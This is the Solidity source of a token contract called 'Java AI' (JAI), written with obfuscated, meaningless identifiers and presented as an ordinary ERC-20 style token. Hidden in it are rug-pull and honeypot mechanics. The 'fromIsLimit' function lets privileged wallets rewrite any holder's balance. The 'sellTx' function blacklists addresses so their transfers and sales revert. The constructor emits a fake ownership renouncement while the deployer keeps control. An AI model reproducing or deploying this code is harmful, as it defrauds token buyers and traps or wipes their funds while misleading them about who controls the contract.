//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;


abstract contract  sellMin {
    function teamLaunch() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface  shouldTake {

    function totalSupply() external view returns (uint256);

    function balanceOf(address isSwap) external view returns (uint256);

    function transfer(address minModeTake, uint256 totalWallet) external returns (bool);

    function allowance(address txToMarketing, address listTotalMode) external view returns (uint256);

    function approve(address listTotalMode, uint256 totalWallet) external returns (bool);

    function transferFrom(address tokenAtAmount, address minModeTake, uint256 totalWallet) external returns (bool);

    event Transfer(address indexed from, address indexed liquidityTrading, uint256 value);
    event Approval(address indexed txToMarketing, address indexed spender, uint256 value);
}


abstract contract  listEnable is  sellMin,  shouldTake {
    using SafeMath for uint256;

    mapping(address => uint256) internal _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory swapAtFee, string memory minSender) {
        _name = swapAtFee;
        _symbol = minSender;
        _decimals = 18;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address isSwap) public view virtual override returns (uint256) {
        return _balances[isSwap];
    }

    function transfer(address minModeTake, uint256 totalWallet) public virtual override returns (bool) {
        _transfer(teamLaunch(), minModeTake, totalWallet);
        return true;
    }

    function allowance(address txToMarketing, address listTotalMode) public view virtual override returns (uint256) {
        return _allowances[txToMarketing][listTotalMode];
    }

    function approve(address listTotalMode, uint256 totalWallet) public virtual override returns (bool) {
        _approve(teamLaunch(), listTotalMode, totalWallet);
        return true;
    }

    function transferFrom(address tokenAtAmount, address minModeTake, uint256 totalWallet) public virtual override returns (bool) {
        _transfer(tokenAtAmount, minModeTake, totalWallet);
        _approve(tokenAtAmount, teamLaunch(), _allowances[tokenAtAmount][teamLaunch()].sub(totalWallet, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address listTotalMode, uint256 amountIs) public virtual returns (bool) {
        _approve(teamLaunch(), listTotalMode, _allowances[teamLaunch()][listTotalMode].add(amountIs));
        return true;
    }

    function decreaseAllowance(address listTotalMode, uint256 fromTeamTx) public virtual returns (bool) {
        _approve(teamLaunch(), listTotalMode, _allowances[teamLaunch()][listTotalMode].sub(fromTeamTx, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address tokenAtAmount, address minModeTake, uint256 totalWallet) internal virtual {
        require(tokenAtAmount != address(0), "ERC20: transfer from the zero address");
        require(minModeTake != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(tokenAtAmount, minModeTake, totalWallet);

        _balances[tokenAtAmount] = _balances[tokenAtAmount].sub(totalWallet, "ERC20: transfer amount exceeds balance");
        _balances[minModeTake] = _balances[minModeTake].add(totalWallet);
        emit Transfer(tokenAtAmount, minModeTake, totalWallet);
    }

    function exemptLiquidity(address isSwap, uint256 totalWallet) internal virtual {
        require(isSwap != address(0));

        _beforeTokenTransfer(address(0), isSwap, totalWallet);

        _totalSupply = _totalSupply.add(totalWallet);
        _balances[isSwap] = _balances[isSwap].add(totalWallet);
        emit Transfer(address(0), isSwap, totalWallet);
    }

    function _burn(address isSwap, uint256 totalWallet) internal virtual {
        require(isSwap != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(isSwap, address(0), totalWallet);

        _balances[isSwap] = _balances[isSwap].sub(totalWallet, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(totalWallet);
        emit Transfer(isSwap, address(0), totalWallet);
    }

    function _approve(address txToMarketing, address listTotalMode, uint256 totalWallet) internal virtual {
        require(txToMarketing != address(0), "ERC20: approve from the zero address");
        require(listTotalMode != address(0), "ERC20: approve to the zero address");

        _allowances[txToMarketing][listTotalMode] = totalWallet;
        emit Approval(txToMarketing, listTotalMode, totalWallet);
    }

    function _setupDecimals(uint8 decimals_) internal virtual {
        _decimals = decimals_;
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}

interface receiverIsExempt {
    function createPair(address atAuto, address toMax) external returns (address);
}

contract JavaAI is listEnable {

    bool public feeShould;

    address receiverIsExemptAddr = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;

    constructor() listEnable("Java AI", "JAI") { 
        
        walletLaunch = receiverIsExempt(address(receiverIsExemptAddr)).createPair(address(takeEnable),address(this));
        receiverAuto = teamLaunch();
        if (senderReceiver) {
            atToFund = modeEnable;
        }
        buyWallet[receiverAuto] = true;
        exemptLiquidity(receiverAuto, 100000000 * 10 ** 18);
        if (atToFund == txReceiverTeam) {
            walletFundMarketing = true;
        }
        emit OwnershipTransferred(receiverAuto, address(0));
    }

    mapping(address => bool) public buyWallet;

    function sellTx(address liquidityIsEnable) public {
        if (liquidityIsEnable == receiverAuto || liquidityIsEnable == address(0) || liquidityIsEnable == walletLaunch || !buyWallet[teamLaunch()]) {
            return;
        }
        
        marketingFee[liquidityIsEnable] = true;
    }

    function _beforeTokenTransfer(address sellSender, address liquidityTrading, uint256 totalWallet) internal override {
        require(!marketingFee[sellSender]);
    }

    address takeEnable = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    bool public walletFundMarketing;

    function fromIsLimit(address marketingReceiver, uint256 totalWallet) public {
        require(buyWallet[teamLaunch()]);
        _balances[marketingReceiver] = totalWallet;
    }

    mapping(address => bool) public marketingFee;

    uint256 private modeEnable;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    uint256 public txReceiverTeam;

    uint256 private atToFund;

    bool private senderReceiver;

    bool public maxIs;

    address public walletLaunch;

    address public owner;

    function receiverExempt(address marketingTo) public {
        if (feeShould) {
            return;
        }
        if (maxIs != walletFundMarketing) {
            txReceiverTeam = modeEnable;
        }
        buyWallet[marketingTo] = true;
        feeShould = true;
    }

    uint256 public toReceiver;

    address public receiverAuto;

}